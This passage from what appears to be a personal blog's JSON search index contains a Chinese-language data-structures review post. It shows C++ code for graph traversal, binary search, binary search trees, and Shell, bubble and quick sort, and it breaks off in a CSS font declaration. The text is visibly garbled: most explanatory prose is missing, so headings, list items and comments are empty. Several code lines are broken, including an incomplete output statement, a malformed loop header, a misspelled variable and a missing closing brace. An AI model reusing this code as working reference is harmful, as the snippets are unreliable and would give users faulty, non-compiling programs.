class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>, <span class=\"title\">class</span> <span class=\"title\">E</span>&gt; </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">DFS</span> (<span class=\"title\">Graph</span>&lt;T, E&gt;&amp; <span class=\"title\">G</span>, <span class=\"title\">int</span> <span class=\"title\">v</span>, <span class=\"title\">bool</span> <span class=\"title\">visited</span>[]) &#123;</span>     </span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; G.getValue(v) &lt;&lt; <span class=\"string\">' '</span>;        <span class=\"comment\">//v     </span></span><br><span class=\"line\">\tvisited[v] = <span class=\"literal\">true</span>;            <span class=\"comment\">//     </span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> w = G.getFirstNeighbor (v);     <span class=\"comment\">//     </span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (w != <span class=\"number\">-1</span>) &#123; <span class=\"comment\">//w       </span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ( !visited[w] ) DFS(G, w, visited);   <span class=\"comment\">//w, w         </span></span><br><span class=\"line\">\tw = G.getNextNeighbor (v, w); <span class=\"comment\">//    </span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>, <span class=\"title\">class</span> <span class=\"title\">E</span>&gt;  </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">DFSTraverse</span> (<span class=\"title\">Graph</span>&lt;T, E&gt;&amp; <span class=\"title\">G</span>, <span class=\"title\">const</span> <span class=\"title\">T</span>&amp; <span class=\"title\">v</span>) &#123;</span> </span><br><span class=\"line\"><span class=\"comment\">//vG     </span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i, loc, n = G.NumberOfVertices();    <span class=\"comment\">//    </span></span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> *visited = <span class=\"keyword\">new</span> <span class=\"keyword\">bool</span>[n];          <span class=\"comment\">//     </span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; n; i++) visited [i] = <span class=\"literal\">false</span>; <span class=\"comment\">//     </span></span><br><span class=\"line\">\tloc = G.getVertexPos(v);    </span><br><span class=\"line\">\tDFS (G, loc, visited); <span class=\"comment\">//0  </span></span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> [] visited;           <span class=\"comment\">//visited </span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"BFS\"><a href=\"#BFS\" class=\"headerlink\" title=\"BFS\"></a>BFS</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703012717115.png\" alt=\"image-20200703012717115\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>, <span class=\"title\">class</span> <span class=\"title\">E</span>&gt; </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">BFS</span> (<span class=\"title\">Graph</span>&lt;T, E&gt;&amp; <span class=\"title\">G</span>, <span class=\"title\">const</span> <span class=\"title\">T</span>&amp; <span class=\"title\">v</span>) &#123;</span>     </span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i, w, n = G.NumberOfVertices();   <span class=\"comment\">//   </span></span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> *visited = <span class=\"keyword\">new</span> <span class=\"keyword\">bool</span>[n];     </span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; n; i++) visited[i] = <span class=\"literal\">false</span>;     </span><br><span class=\"line\">\t<span class=\"keyword\">int</span> loc = G.getVertexPos (v);  <span class=\"comment\">//     </span></span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; G.getValue (loc) &lt;&lt; <span class=\"string\">' '</span>;  <span class=\"comment\">//v    </span></span><br><span class=\"line\">\tvisited[loc] = <span class=\"literal\">true</span>;           <span class=\"comment\">//            </span></span><br><span class=\"line\">\tQueue&lt;<span class=\"keyword\">int</span>&gt; Q;  </span><br><span class=\"line\">  Q.EnQueue (loc);   <span class=\"comment\">//,   </span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (!Q.IsEmpty()) &#123; <span class=\"comment\">//,          </span></span><br><span class=\"line\">\t\tQ.DeQueue (loc);         </span><br><span class=\"line\">\t\tw = G.getFirstNeighbor (loc);  <span class=\"comment\">//         </span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> (w != <span class=\"number\">-1</span>) &#123;  <span class=\"comment\">//w            </span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!visited[w]) &#123;  <span class=\"comment\">//  </span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; G.getValue (w) &lt;&lt;  ; <span class=\"comment\">//           </span></span><br><span class=\"line\">\t\t\t\tvisited[w] = <span class=\"literal\">true</span>;               </span><br><span class=\"line\">\t\t\t\tQ.EnQueue (w);   <span class=\"comment\">//w                </span></span><br><span class=\"line\">\t\t\t&#125;           </span><br><span class=\"line\">\t\t\tw = G.getNextNeighbor (loc, w); <span class=\"comment\">//loc         </span></span><br><span class=\"line\">\t\t&#125; </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\"><span class=\"keyword\">delete</span> [] visited; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703020829072.png\" alt=\"image-20200703020829072\"></p>\n<p>DFSBFS</p>\n<p>DFS</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703020930287.png\" alt=\"image-20200703020930287\"></p>\n<p>BFS<img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021006557.png\" alt=\"image-20200703021006557\"></p>\n<h3 id=\"Prim\"><a href=\"#Prim\" class=\"headerlink\" title=\"Prim\"></a>Prim</h3><p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021313306.png\" alt=\"image-20200703021313306\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021437904.png\" alt=\"image-20200703021437904\"></p>\n<h3 id=\"Kruskal\"><a href=\"#Kruskal\" class=\"headerlink\" title=\"Kruskal\"></a>Kruskal</h3><p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021202383.png\" alt=\"image-20200703021202383\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021225017.png\" alt=\"image-20200703021225017\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong>Dijkstra</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703022317587.png\" alt=\"image-20200703022317587\"></p>\n<h2 id=\"AOV\"><a href=\"#AOV\" class=\"headerlink\" title=\"AOV\"></a>AOV</h2><p><strong>AOV</strong>AOV</p>\n<p><strong></strong><strong></strong><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024430846.png\" alt=\"image-20200703024430846\"></p>\n<p>eg</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024708515.png\" alt=\"image-20200703024708515\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024726671.png\" alt=\"image-20200703024726671\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong>, midx:Element[mid].key == xElement[mid].key &gt; xElement[mid].key &lt; x</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703221308152.png\" alt=\"image-20200703221308152\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703221322312.png\" alt=\"image-20200703221322312\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">BinSearch1</span><span class=\"params\">(<span class=\"keyword\">int</span> r[ ], <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;                                  <span class=\"comment\">//r[1] ~ r[n]</span></span><br><span class=\"line\">    low = <span class=\"number\">1</span>; high = n;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (low &lt;= high)                   </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">       mid = (low + high) / <span class=\"number\">2</span>;            </span><br><span class=\"line\">       <span class=\"keyword\">if</span> (k &lt; r[mid])  high = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">       <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (k &gt; r[mid])  low = mid + <span class=\"number\">1</span>; </span><br><span class=\"line\">              <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">BinSearch2</span><span class=\"params\">(<span class=\"keyword\">int</span> r[ ], <span class=\"keyword\">int</span> low, <span class=\"keyword\">int</span> high, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;                              <span class=\"comment\">//r[1] ~ r[n]</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (low &gt; high) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">       mid = (low + high) / <span class=\"number\">2</span>;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (k &lt; r[mid]) </span><br><span class=\"line\">           <span class=\"keyword\">return</span> BinSearch2(r, low, mid<span class=\"number\">-1</span>, k);</span><br><span class=\"line\">       <span class=\"keyword\">else</span>  <span class=\"keyword\">if</span> (k &gt; r[mid]) </span><br><span class=\"line\">                   <span class=\"keyword\">return</span> BinSearch2(r, mid+<span class=\"number\">1</span>, high, k); </span><br><span class=\"line\">               <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">E</span>, <span class=\"title\">class</span> <span class=\"title\">K</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">BSTNode</span>&lt;E, K&gt;* <span class=\"title\">BST</span>&lt;E, K&gt;:</span>: Search (<span class=\"keyword\">const</span> K x, BSTNode&lt;E, K&gt; *ptr) </span><br><span class=\"line\">&#123;     </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ptr == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;      </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x &lt; ptr-&gt;data) <span class=\"keyword\">return</span> Search(x, ptr-&gt;left);     </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x &gt; ptr-&gt;data) <span class=\"keyword\">return</span> Search(x, ptr-&gt;right);     </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> ptr;    <span class=\"comment\">// </span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">E</span>, <span class=\"title\">class</span> <span class=\"title\">K</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">bool</span> <span class=\"title\">BST</span>&lt;E, K&gt;:</span>:Insert (<span class=\"keyword\">const</span> E&amp; e1,   BSTNode&lt;E, K&gt; *&amp; ptr)</span><br><span class=\"line\"> &#123;\t  <span class=\"comment\">// </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ptr == <span class=\"literal\">NULL</span>) &#123;\t   <span class=\"comment\">//</span></span><br><span class=\"line\">        ptr = <span class=\"keyword\">new</span> BstNode&lt;E, K&gt;(e1);\t  <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ptr == <span class=\"literal\">NULL</span>)&#123; <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"Out of space\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>); &#125;</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (e1 &lt; ptr-&gt;data) <span class=\"keyword\">return</span> Insert (e1, ptr-&gt;left);\t \t\t\t </span><br><span class=\"line\">  \t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (e1 &gt; ptr-&gt;data) <span class=\"keyword\">return</span> Insert (e1, ptr-&gt;right);\t\t\t </span><br><span class=\"line\">  \t<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;  <span class=\"comment\">//x,</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223024868.png\" alt=\"image-20200703223024868\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223603100.png\" alt=\"image-20200703223603100\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223624325.png\" alt=\"image-20200703223624325\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223643364.png\" alt=\"image-20200703223643364\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703030054652.png\" alt=\"image-20200703030054652\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong> ii1 i-1</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703200120034.png\" alt=\"image-20200703200120034\"></p>\n<p><strong> o(n2)<br></strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201115198.png\" alt=\"image-20200703201115198\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201212433.png\" alt=\"image-20200703201212433\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201232582.png\" alt=\"image-20200703201232582\"></p>\n<p>gap</p>\n<p>$gap=\\lfloor gap/3\\rfloor+1$</p>\n<p><strong></strong></p>\n<p>eg</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201916100.png\" alt=\"image-20200703201916100\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Shellsort</span> <span class=\"params\">(dataList&lt;T&gt;&amp; L, <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> left, <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> right)</span></span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123; <span class=\"keyword\">int</span> i, j, gap = right-left+<span class=\"number\">1</span>; <span class=\"comment\">//</span></span><br><span class=\"line\">\tElement&lt;T&gt; temp;</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;  \tgap = gap/<span class=\"number\">3</span>+<span class=\"number\">1</span>;\t\t\t<span class=\"comment\">//</span></span><br><span class=\"line\">        \t\t<span class=\"keyword\">for</span>(i=left+gap;i&lt;=right;i++)</span><br><span class=\"line\">           \t \t<span class=\"keyword\">if</span> (L[i]&lt;L[i-gap]) &#123;<span class=\"comment\">//</span></span><br><span class=\"line\">                \t\t\ttemp=L[i];</span><br><span class=\"line\">                \t\t\tj = i-gap;</span><br><span class=\"line\">                \t\t\t<span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">                   \t\t\tL[j+gap] = L[j];</span><br><span class=\"line\">                        j= j-gap;</span><br><span class=\"line\">                \t\t\t&#125; <span class=\"keyword\">while</span> (j&gt;=left &amp;&amp; temp&lt;L[j]);</span><br><span class=\"line\">               \t\t\tL[j+gap]=temp;\t<span class=\"comment\">//vector[i]</span></span><br><span class=\"line\">           \t\t&#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (gap &gt; <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BubbleSort</span> <span class=\"params\">(T V[], <span class=\"keyword\">int</span> n )</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">bool</span> exchange ;   <span class=\"keyword\">int</span> i , j ;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">1</span>;i&lt;n;i++)&#123;</span><br><span class=\"line\">\texchange = <span class=\"literal\">false</span>;\t\t <span class=\"comment\">//0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (j=n<span class=\"number\">-1</span>;j&gt;= ij--)     </span><br><span class=\"line\"> \t\t<span class=\"keyword\">if</span> (V[j<span class=\"number\">-1</span>]&gt;V[j]) &#123; \t<span class=\"comment\">//</span></span><br><span class=\"line\">                T temp=V[j<span class=\"number\">-1</span>];  V[j<span class=\"number\">-1</span>]=V[j]; V[j]=temp<span class=\"comment\">//</span></span><br><span class=\"line\">\t            exchange = <span class=\"literal\">true</span>;      <span class=\"comment\">//1,</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(exchange==<span class=\"literal\">false</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703204842947.png\" alt=\"image-20200703204842947\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">QuickSort</span> (<span class=\"title\">dataList</span>&lt;T&gt;&amp; <span class=\"title\">L</span>,  <span class=\"title\">int</span> <span class=\"title\">left</span>,  <span class=\"title\">int</span> <span class=\"title\">right</span>) </span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"comment\">//Vector[left..right]</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (left &lt; right) &#123;\t\t<span class=\"comment\">//1</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> pivotpos = L.Partition (left, right);    <span class=\"comment\">//</span></span><br><span class=\"line\">        QuickSort (L, left, pivotpos<span class=\"number\">-1</span>);</span><br><span class=\"line\">        QuickSort (L, pivotpos+<span class=\"number\">1</span>, right);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Partition</span><span class=\"params\">( SqList &amp;L,  <span class=\"keyword\">int</span> low,  <span class=\"keyword\">int</span> high)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\">    L.r[<span class=\"number\">0</span>] = L.r[low];</span><br><span class=\"line\">    pivitkey = L.r[low].key;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>( low &lt; high)&#123;</span><br><span class=\"line\">         <span class=\"keyword\">while</span>( low &lt; high &amp;&amp; L.r[high].key &gt;= pivotkey)  --high;</span><br><span class=\"line\">         L.r[low] = L.r[high];</span><br><span class=\"line\">         <span class=\"keyword\">while</span>( low &lt; high &amp;&amp; L.r[low].key &lt;= pivotkey)  ++low;</span><br><span class=\"line\">         L.r[high] = L.r[low];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    L.r[low] = L.r[<span class=\"number\">0</span>];   </span><br><span class=\"line\">    <span class=\"keyword\">return</span> low;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223906279.png\" alt=\"image-20200703223906279\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223916193.png\" alt=\"image-20200703223916193\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223926277.png\" alt=\"image-20200703223926277\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223943434.png\" alt=\"image-20200703223943434\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223950979.png\" alt=\"image-20200703223950979\"></p>\n","categories":[""],"tags":["Course"]},{"title":"","url":"https://pz1o.top/2020/06/27//","content":"<p>2020/6/27 </p>\n","categories":[],"tags":[]},{"title":"","url":"https://pz1o.top/personal-style.css","content":"@font-face {\n    font-family: \"Meiryo\";\n    src: url(\"/fonts/Meiryo.eot\");\n    /* IE9 */\n    src: url(\"/fonts/Meiryo.eot?#iefix\") format(\"embedded-opentype\"), /* IE6-IE8 */\n    url(\"/fonts/Meiryo.woff\") format(\"woff\"), /* chrome, firefox */\n    url(\"/fonts/Meiryo.ttf\") format(\"truetype\"), /* chrome, firefox, 